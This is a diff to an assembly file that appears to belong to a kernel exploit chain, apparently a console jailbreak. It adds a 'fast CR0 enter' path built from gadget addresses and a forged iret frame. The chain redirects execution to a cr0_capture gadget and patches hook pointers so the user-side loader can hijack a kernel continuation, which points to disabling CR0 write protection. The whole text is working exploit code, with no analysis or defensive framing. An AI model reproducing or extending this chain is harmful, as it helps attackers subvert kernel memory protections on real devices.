@@ -20,6 +20,7 @@ extern uelf_entry
 extern ist_errc
 extern ist_noerrc
 extern comparison_table
+extern cr0_capture
 extern cr0_load
 extern cr0_clear_store
 extern cr0_write_ret
@@ -472,6 +473,7 @@ times iret_rip-(ist_after_restore_cr3-iret_frame_after_restore_cr3) db 0
 dq nop_ret
 dq 0x20
 dq 2
+ist_after_restore_cr3_rsp:
 dq return_to_caller
 dq 0
 
@@ -511,8 +513,12 @@ times 5 dq 0
 
 ; UELF learns the address of the final-HLT RSP slot through the trap frame;
 ; this keeps KELF-private symbol addresses out of the separately loaded UELF.
+times fpu_cr0_exit_hook_ptr_offset-($-regs_for_exit) db 0
 fpu_cr0_exit_hook_ptr:
 dq ist_after_userspace_rsp
+times fpu_cr0_enter_hook_ptr_offset-($-regs_for_exit) db 0
+fpu_cr0_enter_hook_ptr:
+dq ist_after_restore_cr3_rsp
 
 ; CR0 save/clear stack.  The padding slots normalize helpers which end in
 ; either RET (2.50) or POP RBP; RET (4.03/7.61/9.40).
@@ -561,3 +567,21 @@ dq 0
 ; this whole block at once so stale state cannot pass validation.
 times fpu_cr0_scratch_offset-($-regs_for_exit) db 0
 times 0x68 db 0
+
+; Fast CR0 enter service.  UELF redirects the post-CR3 continuation here for
+; exactly one yield.  Reset the hook first, then enter the same validated
+; save/clear continuation used by the generic run_gadget fallback.
+times fpu_cr0_fast_enter_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_fast_enter_stack:
+pokeq ist_after_restore_cr3_rsp, return_to_caller
+dq pop_all_iret
+times iret_rdi db 0
+dq regs_for_exit+fpu_cr0_scratch_offset
+times iret_rsi-iret_rdi-8 db 0
+dq regs_for_exit+fpu_cr0_cleared_offset
+times iret_rip-iret_rsi-8 db 0
+dq cr0_capture
+dq 0x20
+dq 2
+dq regs_for_exit+fpu_cr0_enter_stack_offset
+dq 0
